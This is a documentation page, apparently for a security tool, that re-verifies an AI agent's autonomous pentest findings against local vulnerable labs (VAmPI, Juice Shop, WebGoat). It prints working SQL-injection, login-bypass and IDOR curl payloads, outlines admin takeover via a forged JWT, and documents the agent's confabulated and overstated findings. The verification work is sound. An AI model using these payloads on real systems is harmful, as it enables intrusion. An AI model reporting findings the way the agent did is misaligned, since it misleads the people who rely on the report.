---
title: Verifying findings — two case studies
layout: default
nav_order: 7
---

# Verifying findings: two case studies
{: .no_toc }

Autonomous findings are a *hypothesis*, not a result. This page proves why, with full data from
**two runs of the same model (`qwen3:30b-a3b`) against two different labs** — where every reported
finding was independently re-tested against the live target.
{: .fs-5 .fw-300 }

<details open markdown="block">
  <summary>Table of contents</summary>
  {: .text-delta }
- TOC
{:toc}
</details>

{: .warning }
> **Authorized use only.** Both targets are local, isolated, intentionally-vulnerable labs
> (VAmPI and OWASP Juice Shop) run for security education. Every request below was issued against
> `localhost`.

---

## Why re-verify at all

[Troubleshooting](./troubleshooting#a-confirmed-finding-that-isnt-real) already states the rule:
**independently verify every finding's PoC before you trust it.** These two runs turn that rule from
advice into measured fact. The headline:

- The model **never missed an easy, unauthenticated bug.** Every one-request flaw was found.
- On the **harder, multi-step bugs it was unreliable**: it overstated impact, fabricated one PoC
  from a benign response, used under-powered evidence, and missed the single most severe issue.
- A reported finding was **right about ~half the time on the specifics**, even when the underlying
  vulnerability class was real.

The verification method is boring on purpose: take the PoC exactly as written, replay it against the
live app, and compare the *actual* response to the *claimed* one. Where the agent used privileged or
circular setup (e.g. "read user 2 with an admin token"), re-run it from the **least-privileged**
position that would actually prove the claim.

---

## Case study A — VAmPI (task 22)

`qwen3:30b-a3b` · 196 LLM calls · 2.35M in / 0.50M out tokens · ~5.5 h · 6 findings reported.

Goal: a per-objective API assessment with eager reporting (the goal followed every
[goal-design lesson](./running#goal-design-the-difference-between-0-findings-and-3)). It decomposed
cleanly into 6 goals and reported 6 findings. Verification tells a more complicated story.

| # | Reported finding | Verdict | What the live target actually does |
|---|------------------|---------|-------------------------------------|
| 402 | `/users/v1/_debug` leaks all passwords | ✅ **accurate** | Unauth; dumps every user incl. `admin / pass1` in cleartext |
| 407 | Mass-assignment self-admin | ✅ **accurate** | `register` with `"admin":true` → account created with `admin:true` |
| 429 | Books BOLA | ✅ **accurate** | Any user's token reads any book's `secret` |
| 433 | Unauth user lookup | ✅ **accurate** | `GET /users/v1/{username}` returns data with no token |
| 415 | User-lookup "IDOR" | ⚠️ **real, overstated** | Returns **username/email only — no password**; and it's no-auth, not JWT-scoped |
| 441 | SQLi in `register` | ❌ **false positive** | `register` is parameterized; the real SQLi is elsewhere |

Plus one finding the model **never reported at all** — the most severe on the target.

### The false positive (441) — confabulation from a benign response

The agent sent a `UNION SELECT` string as the registration username, received
`200 "Successfully registered"`, and concluded "exploitation without error." It isn't:

```bash
# Register a username containing a lone quote. A concatenated INSERT would throw;
# a parameterized one stores it verbatim.
curl -s -X POST http://localhost:5001/users/v1/register \
  -H 'Content-Type: application/json' \
  --data-binary '{"username":"sqt_test1'\''","password":"Pw!2","email":"a@t.local"}'
# → {"status":"success", ...}

# _debug shows it was stored LITERALLY — no injection occurred:
curl -s http://localhost:5001/users/v1/_debug | grep sqt_test1
# → "username": "sqt_test1'"
```

The agent's own UNION payload is sitting in the users table as a literal username. (It also used
`@@version` — MySQL syntax — against a **SQLite** backend, so the payload could never have worked.)
This is the exact failure mode from
[Troubleshooting](./troubleshooting#a-confirmed-finding-that-isnt-real): a model reading a
non-error as proof.

### The real SQLi — right class, wrong endpoint

SQLi *is* present on VAmPI — in the **username lookup**, not `register`:

```bash
# Tautology returns the first row instead of a 404:
curl -s "http://localhost:5001/users/v1/admin%27%20OR%20%271%27%3D%271"
# → {"username": "name1", ...}

# Column-count mismatch leaks the raw error — definitive proof of concatenated SQL:
curl -s "http://localhost:5001/users/v1/qwe%27%20UNION%20SELECT%20username,password%20FROM%20users--%20"
# → sqlite3.OperationalError: SELECTs to the left and right of UNION
#    do not have the same number of result columns
```

### The overstatement (415)

The finding claimed `GET /users/v1/{username}` returns "username, email, **password**" via a
standard-user JWT. It returns only username and email, and needs **no token**:

```bash
curl -s http://localhost:5001/users/v1/admin           # no Authorization header
# → {"username": "admin", "email": "admin@mail.com"}   # no password field
```

Real access-control flaw, materially weaker (and differently shaped) than reported. The model later
reported the same endpoint *correctly* as finding 433 — so its own report contained both the
overstated and the accurate version of one bug.

### The miss — forgeable JWT → admin takeover

The planner marked the "weak JWT" goal **met** on the back of 433 (unauthenticated read). It never
discovered that the JWT signing secret is literally `"random"`, which allows full account takeover:

```bash
# Forge an HS256 token for sub:admin with secret "random", then change admin's password:
#   PUT /users/v1/admin/password  →  HTTP 204 (success)
```

This is the most severe issue on the target, and the autonomous run shipped without it. A goal can
be "met" by the weakest finding that nominally satisfies it.

---

## Case study B — OWASP Juice Shop (task 9)

`qwen3:30b-a3b` · 581 LLM calls · 3.89M in / 0.87M out tokens · ~11 h · 3 findings reported.

A different target, the **same model**. Here it reported fewer findings but **no false positives** —
though two of the three leaned on under-powered evidence that verification had to shore up.

| # | Reported finding | Verdict | Verification against live target |
|---|------------------|---------|----------------------------------|
| 118 | SQLi in `/rest/products/search` (`q`) | ✅ **real** | Agent's `' OR '1'='1` returned all 46 products (weak); the UNION probe gives the real proof: **HTTP 500 `SQLITE_ERROR`** |
| 186 | Login auth-bypass SQLi | ✅ **accurate** | `email=' OR 1=1 --` → HTTP 200 + token for `admin@juice-sh.op` |
| 192 | IDOR in `/api/Users/{id}` | ✅ **real, weak PoC** | Agent used an **admin** token (proves nothing); a fresh **customer** token reading `/api/Users/1` returns admin's record |

```bash
# 118 — definitive, error-based proof (agent's "returns all products" is only suggestive):
curl -s "http://localhost:3000/rest/products/search?q=qwert%27))%20UNION%20SELECT%201--"
# → HTTP 500 ... SQLITE_ERROR

# 186 — login bypass returns a real session as the first user (admin):
curl -s -X POST http://localhost:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  --data-binary '{"email":"'\'' OR 1=1 --","password":"x"}'
# → 200 {"authentication":{"token":"...","email":"admin@juice-sh.op"}}

# 192 — the IDOR, proven from least privilege (a brand-new customer, not an admin):
#   GET /api/Users/1  with a customer token  → 200, admin's record
#   GET /api/Users/1  with no token          → 401
```

The lesson in 192 is subtle but important: **the agent's PoC was logically circular.** Reading any
user with an *admin* token is expected behaviour, not IDOR. Only a request from a lower-privileged
identity demonstrates the broken object-level authorization. The vulnerability is real; the evidence
as written did not establish it.

---

## Verifying through the UI — when a browser beats curl

Every verdict above was reached by **replaying the PoC with curl**. There is a second, sometimes
stronger way to confirm a finding: **drive the exploit through the app's real interface with a
browser and let the application confirm the result itself.** (This uses a browser-automation tool
driven by Claude Code — separate from ARTEX and from ARTEX's own traffic-capture extension.)

Worked example — the Juice Shop login bypass from [Case study B](#case-study-b--owasp-juice-shop-task-9),
re-run through the actual login form instead of curl. Typing `' OR 1=1 --` into the **email** field
and submitting made Juice Shop **solve its own "Login Admin" challenge** — the app announcing, in its
own UI, that we authenticated as the administrator. That is stronger evidence than a curl `200`: the
target itself adjudicated the exploit. The run was captured as a shareable GIF:

![Juice Shop login-bypass: typing ' OR 1=1 -- into the email field logs in as admin and solves the
"Login Admin" challenge](./assets/images/juiceshop-sqli-login-bypass.gif)
{: .text-center }

**Reach for a browser pass when:**

- the bug lives in a **UI-only flow** (multi-step forms, client-side state) that is awkward to script;
- it is a **client-side vulnerability that must render to be real** — stored/DOM XSS, clickjacking,
  CSP behaviour — where "it executed in a browser" *is* the proof;
- you want **evidence a human can watch** — screenshots or a GIF for the report.

**Stick with curl / ARTEX when:**

- the target is a **JSON API** (e.g. VAmPI) — a browser just renders raw JSON and adds nothing;
- you need **breadth or fuzzing** — many payloads across many endpoints.

Honest costs, observed on this run: browser automation is **slower and heavier per step** (each action
is a screenshot round-trip), **coordinate-driven input is brittle on dynamic SPAs** (a success banner
shifted the form down and the next click missed, silently), and **network capture must be armed before
the action** and resets on navigation — so decide to record *before* you fire the exploit, not after.

Bottom line: a browser pass is **another verification instrument**, complementary to curl and ARTEX,
not a replacement. Use it where the UI *is* the attack surface or where seeing the app react is the
proof; stay on curl for everything API-shaped. See
[Choosing your tool](#choosing-your-tool-browser-proxy-or-curl) below for the full map by
vulnerability class.

---

## Cross-run comparison

Same model, two targets, every finding verified:

| | VAmPI (task 22) | Juice Shop (task 9) |
|---|---|---|
| Model | `qwen3:30b-a3b` | `qwen3:30b-a3b` |
| LLM calls | 196 | 581 |
| Tokens (in / out) | 2.35M / 0.50M | 3.89M / 0.87M |
| Wall-clock | ~5.5 h | ~11 h |
| Findings reported | 6 | 3 |
| Fully accurate | 3 | 1 |
| Real but weak/overstated | 1 | 2 |
| False positives | 1 | 0 |
| Severe issues missed | 1 (JWT takeover) | — (not re-scoped) |

---

## A taxonomy of what verification caught

Across both runs, the failures cluster into five repeatable patterns. Watch for each when you triage
an autonomous report:

1. **Confabulated PoC** — a benign response (`200 success`) read as exploitation. *(VAmPI 441.)*
   Counter: reproduce the PoC and confirm the *mechanism* (an error, leaked data, a boundary
   crossed), not just a status code.
2. **Overstated impact** — the vuln is real but the claimed data/scope is inflated. *(VAmPI 415,
   "password" that isn't returned.)* Counter: diff the claimed response against the actual bytes.
3. **Under-powered evidence** — the right conclusion reached by the wrong demonstration.
   *(Juice Shop 192, admin token; 118, "all products" instead of a SQL error.)* Counter: re-run from
   the least-privileged position that would actually prove it.
4. **Mis-attributed endpoint** — correct vulnerability class, wrong location. *(VAmPI 441 vs. the
   real `/users/v1/{username}` SQLi.)* Counter: don't accept the endpoint; probe siblings.
5. **Severity miss** — a goal marked "met" by the weakest finding that satisfies it, hiding a worse
   one. *(VAmPI JWT.)* Counter: treat "goal met" as "a finding exists," not "the target is clear."

None of this means the autonomy is worthless — far from it. The model did the broad, tedious
enumeration and surfaced every easy bug for free. But the final report is a **draft for a human to
verify**, and on these runs roughly half the specifics needed correction. Budget the verification
pass as part of the engagement, not an afterthought.

See also: [Running → reading results & verifying](./running#reading-results-via-the-database) and
[Troubleshooting → a "confirmed" finding that isn't real](./troubleshooting#a-confirmed-finding-that-isnt-real).

---

## Choosing your tool: browser, proxy, or curl

The browser is one instrument on the bench, not the whole kit. Working a cross-section of WebGoat
lessons by hand — SQL injection, reflected XSS, and IDOR — mapped out cleanly which tool fits which
class of bug, and where each one is the wrong choice.

Here the browser is a natural fit: injecting `' OR '1'='1` into WebGoat's SQL-injection form and
letting the lesson adjudicate it ("You have succeeded"), captured end to end —

![WebGoat SQL-injection lesson driven through the browser: an injection typed into the form field is
submitted and the lesson confirms the result](./assets/images/webgoat-sqli-intro-page9.gif)
{: .text-center }

### Fitness by vulnerability class

| Vulnerability class | Browser automation | Why |
|---|:--:|---|
| SQL injection via a form field | ✅ Good | Inject into the real input; the app adjudicates (Juice Shop's challenge banner, WebGoat's "You have succeeded") |
| XSS / DOM / client-side | ⭐ Best — often the only tool | The payload must *execute*; `console.log` + reading the console **proves** it ran, which curl cannot observe |
| Authentication bypass (login form) | ✅ Good | Drive the real login flow end to end; the app confirms the identity |
| IDOR / BOLA | ❌ Poor | No UI control tampers the identifier — you end up scripting `fetch()`, i.e. curl wearing a browser costume |
| Parameter manipulation / forced browsing | ❌ Poor | Request-level work the UI never exposes |
| API fuzzing / input-field discovery | ❌ Poor | Breadth favours spray-and-grep; clicking each candidate by hand is painfully slow |
| Pure JSON API (no UI, e.g. VAmPI) | — N/A | Nothing to drive; a browser only renders raw JSON |

### Techniques that earned their place

Each of these was learned by hitting the opposite the hard way:

- **Select by element reference, don't type at coordinates.** Coordinate input breaks the moment a
  banner or hint box shifts the layout. Setting a field by its element ref is stable.
- **Probe XSS with `console.log`, never `alert`.** A real `alert()` dialog blocks the automation
  outright; `console.log` proves execution just as well and is readable back from the console.
- **Arm recording and network capture *before* you fire the exploit.** Both start empty and reset on
  navigation, so the one request you care about is easily missed.
- **The moment you reach for `fetch()` in the console, ask whether curl is cleaner.** You have left
  UI automation and started doing request-level work by hand.

### The ladder: browser → proxy → curl

IDOR makes the hand-off concrete. In the browser the only control is a "View Profile" button that
returns *your own* record; there is no button to change the id. Exploiting it means scripting a
request — which is just curl with a session cookie. And curl does the whole thing end to end, more
cleanly than the browser:

```bash
# curl, its own cookie jar, no browser needed:
curl -s -c jar -b jar -d "username=tom&password=cat"  http://localhost:8080/WebGoat/IDOR/login
curl -s -b jar  http://localhost:8080/WebGoat/IDOR/profile/2342388   # tampered id → another user
# → "Well done, you found someone else's profile"
```

So where does the browser belong in a request-level attack? **Holding a session that curl cannot
easily obtain** — SSO, SAML/OAuth redirects, MFA, or a JavaScript-heavy login. The pattern is:
authenticate in the browser, then replay and tamper with curl. The snag is the hand-off — a session
cookie is usually `HttpOnly` (and the automation layer blocks `document.cookie` besides), so you
cannot simply copy it across. The bridge that actually works is an **intercepting proxy** between the
browser and the target, which captures the live session and lets you replay and modify requests.

That is precisely what ARTEX is built around: its recording MITM proxy sits in exactly that position
by design, so captured traffic becomes findings that can be retested. The practical ladder:

> **Browser** drives the UI and holds hard-won sessions → an **intercepting proxy** (ARTEX's, Burp,
> or ZAP) captures and replays → **curl** tampers and fuzzes at the request level.

Each tool hands off to the next. The two mistakes to avoid are mirror images: using the browser for
request-level work, or using curl for something that only exists once JavaScript has run.
